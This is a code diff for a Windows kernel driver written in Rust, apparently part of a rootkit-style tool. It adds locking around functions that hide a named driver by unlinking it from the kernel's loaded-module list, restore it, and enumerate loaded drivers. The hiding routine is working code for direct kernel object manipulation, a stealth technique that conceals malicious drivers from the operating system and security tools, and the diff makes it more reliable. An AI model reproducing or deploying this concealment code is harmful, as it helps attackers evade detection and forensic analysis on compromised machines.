@@ -9,8 +9,9 @@ use alloc::{
     vec::Vec,
 };
 
-use crate::LDR_DATA_TABLE_ENTRY;
+use crate::{LDR_DATA_TABLE_ENTRY, lock::with_eresource_lock};
 use crate::{error::ShadowError, uni, Result};
+use crate::data::PsLoadedModuleResource;
 use common::structs::DriverInfo;
 use obfstr::obfstr;
 
@@ -40,49 +41,53 @@ impl Driver {
         }
 
         let list_entry = ldr_data as *mut LIST_ENTRY;
-        let mut next = (*ldr_data).InLoadOrderLinks.Flink as *mut LIST_ENTRY;
 
-        // Iterate through the loaded module list to find the target driver
-        while next != list_entry {
-            let current = next as *mut LDR_DATA_TABLE_ENTRY;
+        // Acquire the lock before modifying the module list
+        with_eresource_lock(PsLoadedModuleResource, || {
+            let mut next = (*ldr_data).InLoadOrderLinks.Flink as *mut LIST_ENTRY;
 
-            // Convert the driver name from UTF-16 to a Rust string
-            let buffer = core::slice::from_raw_parts(
-                (*current).BaseDllName.Buffer,
-                ((*current).BaseDllName.Length / 2) as usize,
-            );
-
-            // Check if the current driver matches the target driver
-            let name = String::from_utf16_lossy(buffer);
-            if name.contains(driver_name) {
-                // The next driver in the chain
-                let next = (*current).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
-
-                // The previous driver in the chain
-                let previous = (*current).InLoadOrderLinks.Blink as *mut LDR_DATA_TABLE_ENTRY;
-
-                // Storing the previous list entry, which will be returned
-                let previous_link = LIST_ENTRY {
-                    Flink: next as *mut LIST_ENTRY,
-                    Blink: previous as *mut LIST_ENTRY,
-                };
-
-                // Unlink the current driver
-                (*next).InLoadOrderLinks.Blink = previous as *mut LIST_ENTRY;
-                (*previous).InLoadOrderLinks.Flink = next as *mut LIST_ENTRY;
-
-                // Make the current driver point to itself to "hide" it
-                (*current).InLoadOrderLinks.Flink = current as *mut LIST_ENTRY;
-                (*current).InLoadOrderLinks.Blink = current as *mut LIST_ENTRY;
-
-                return Ok((previous_link, *current));
+            // Iterate through the loaded module list to find the target driver
+            while next != list_entry {
+                let current = next as *mut LDR_DATA_TABLE_ENTRY;
+    
+                // Convert the driver name from UTF-16 to a Rust string
+                let buffer = core::slice::from_raw_parts(
+                    (*current).BaseDllName.Buffer,
+                    ((*current).BaseDllName.Length / 2) as usize,
+                );
+    
+                // Check if the current driver matches the target driver
+                let name = String::from_utf16_lossy(buffer);
+                if name.contains(driver_name) {
+                    // The next driver in the chain
+                    let next = (*current).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
+    
+                    // The previous driver in the chain
+                    let previous = (*current).InLoadOrderLinks.Blink as *mut LDR_DATA_TABLE_ENTRY;
+    
+                    // Storing the previous list entry, which will be returned
+                    let previous_link = LIST_ENTRY {
+                        Flink: next as *mut LIST_ENTRY,
+                        Blink: previous as *mut LIST_ENTRY,
+                    };
+    
+                    // Unlink the current driver
+                    (*next).InLoadOrderLinks.Blink = previous as *mut LIST_ENTRY;
+                    (*previous).InLoadOrderLinks.Flink = next as *mut LIST_ENTRY;
+    
+                    // Make the current driver point to itself to "hide" it
+                    (*current).InLoadOrderLinks.Flink = current as *mut LIST_ENTRY;
+                    (*current).InLoadOrderLinks.Blink = current as *mut LIST_ENTRY;
+    
+                    return Ok((previous_link, *current));
+                }
+    
+                next = (*next).Flink;
             }
-
-            next = (*next).Flink;
-        }
-
-        // Return an error if the driver is not found
-        Err(ShadowError::DriverNotFound(driver_name.to_string()))
+    
+            // Return an error if the driver is not found
+            Err(ShadowError::DriverNotFound(driver_name.to_string()))
+        })
     }
 
     /// Unhides a previously hidden driver by restoring it to the `PsLoadedModuleList`.
@@ -102,18 +107,20 @@ impl Driver {
         list_entry: PLIST_ENTRY,
         driver_entry: *mut LDR_DATA_TABLE_ENTRY,
     ) -> Result<NTSTATUS> {
-        // Restore the driver's link pointers
-        (*driver_entry).InLoadOrderLinks.Flink = (*list_entry).Flink as *mut LIST_ENTRY;
-        (*driver_entry).InLoadOrderLinks.Blink = (*list_entry).Blink as *mut LIST_ENTRY;
+        with_eresource_lock(PsLoadedModuleResource, || {
+            // Restore the driver's link pointers
+            (*driver_entry).InLoadOrderLinks.Flink = (*list_entry).Flink as *mut LIST_ENTRY;
+            (*driver_entry).InLoadOrderLinks.Blink = (*list_entry).Blink as *mut LIST_ENTRY;
 
-        // Link the driver back into the list
-        let next = (*driver_entry).InLoadOrderLinks.Flink;
-        let previous = (*driver_entry).InLoadOrderLinks.Blink;
+            // Link the driver back into the list
+            let next = (*driver_entry).InLoadOrderLinks.Flink;
+            let previous = (*driver_entry).InLoadOrderLinks.Blink;
 
-        (*next).Blink = driver_entry as *mut LIST_ENTRY;
-        (*previous).Flink = driver_entry as *mut LIST_ENTRY;
+            (*next).Blink = driver_entry as *mut LIST_ENTRY;
+            (*previous).Flink = driver_entry as *mut LIST_ENTRY;
 
-        Ok(STATUS_SUCCESS)
+            Ok(STATUS_SUCCESS)
+        })
     }
 
     /// Enumerates all drivers currently loaded in the kernel.
@@ -137,37 +144,40 @@ impl Driver {
         }
 
         let current = ldr_data as *mut LIST_ENTRY;
-        let mut next = (*ldr_data).InLoadOrderLinks.Flink;
-        let mut count = 0;
 
-        // Iterate over the list of loaded drivers
-        while next != current {
-            let ldr_data_entry = next as *mut LDR_DATA_TABLE_ENTRY;
-
-            // Get the driver name from the `BaseDllName` field, converting it from UTF-16 to a Rust string
-            let buffer = core::slice::from_raw_parts(
-                (*ldr_data_entry).BaseDllName.Buffer,
-                ((*ldr_data_entry).BaseDllName.Length / 2) as usize,
-            );
-
-            // Prepare the name buffer, truncating if necessary to fit the 256-character limit
-            let mut name = [0u16; 256];
-            let length = core::cmp::min(buffer.len(), 255);
-            name[..length].copy_from_slice(&buffer[..length]);
-
-            // Populates the `DriverInfo` structure with name, address, and index
-            drivers.push(DriverInfo {
-                name,
-                address: (*ldr_data_entry).DllBase as usize,
-                index: count as u8,
-            });
-
-            count += 1;
-
-            // Move to the next driver in the list
-            next = (*next).Flink;
-        }
-
-        Ok(drivers)
+        with_eresource_lock(PsLoadedModuleResource, || {
+            let mut next = (*ldr_data).InLoadOrderLinks.Flink;
+            let mut count = 0;
+    
+            // Iterate over the list of loaded drivers
+            while next != current {
+                let ldr_data_entry = next as *mut LDR_DATA_TABLE_ENTRY;
+    
+                // Get the driver name from the `BaseDllName` field, converting it from UTF-16 to a Rust string
+                let buffer = core::slice::from_raw_parts(
+                    (*ldr_data_entry).BaseDllName.Buffer,
+                    ((*ldr_data_entry).BaseDllName.Length / 2) as usize,
+                );
+    
+                // Prepare the name buffer, truncating if necessary to fit the 256-character limit
+                let mut name = [0u16; 256];
+                let length = core::cmp::min(buffer.len(), 255);
+                name[..length].copy_from_slice(&buffer[..length]);
+    
+                // Populates the `DriverInfo` structure with name, address, and index
+                drivers.push(DriverInfo {
+                    name,
+                    address: (*ldr_data_entry).DllBase as usize,
+                    index: count as u8,
+                });
+    
+                count += 1;
+    
+                // Move to the next driver in the list
+                next = (*next).Flink;
+            }
+    
+            Ok(drivers)
+        })
     }
 }
